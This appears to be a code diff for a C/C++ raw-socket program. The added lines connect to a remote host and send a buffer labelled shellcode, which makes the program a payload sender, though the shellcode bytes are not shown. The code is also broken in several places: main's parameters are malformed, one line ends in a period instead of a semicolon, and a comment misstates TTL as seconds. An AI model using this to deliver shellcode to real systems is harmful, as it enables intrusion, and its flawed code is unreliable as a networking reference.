@@ -54,7 +54,7 @@ int main(char ** argv[], int * argc)
 
     host = gethostbyname(address);
 
-    if (host < 0) 
+    if (host == NULL) 
     {
         herror("gethostbyname");
         exit(-1);
@@ -71,7 +71,7 @@ int main(char ** argv[], int * argc)
     storage.sin_port = htons(0); // Port 0 is for dynamic port.
 
     sockaddr_in remote;
-    remote.sin_addr = *( struct in_addr*)host->h_addr_list;
+    remote.sin_addr =*(struct in_addr *)host->h_addr_list[0].
     remote.sin_family = AF_INET;
     remote.sin_port = htons(port);
 
@@ -90,7 +90,8 @@ int main(char ** argv[], int * argc)
         exit(-1);
     }
     // After initial connection has been made, declare IP Header.
-
+    iphdr *header = (iphdr *)malloc(sizeof(iphdr));
+    memset(header, 0, sizeof(iphdr));
     header->saddr = INADDR_ANY;
     header->daddr = inet_addr(address);
     header->ttl = 5; // 5 seconds live time.
@@ -98,5 +99,21 @@ int main(char ** argv[], int * argc)
 
     token.HtonData(header, buffer);
 
-    // Now its time for a check sum.
+
+    // Connect to remote host
+    if (connect(ipv4, (struct sockaddr *)&remote, sizeof(remote)) < 0) {
+        perror("connect");
+        exit(EXIT_FAILURE);
+    }
+
+    // Send the shellcode
+    if (send(ipv4, code, sizeof(code), 0) < 0) {
+        perror("send");
+        exit(EXIT_FAILURE);
+    }
+
+    // Close the socket
+    close(ipv4);
+
+    return 0;
 }
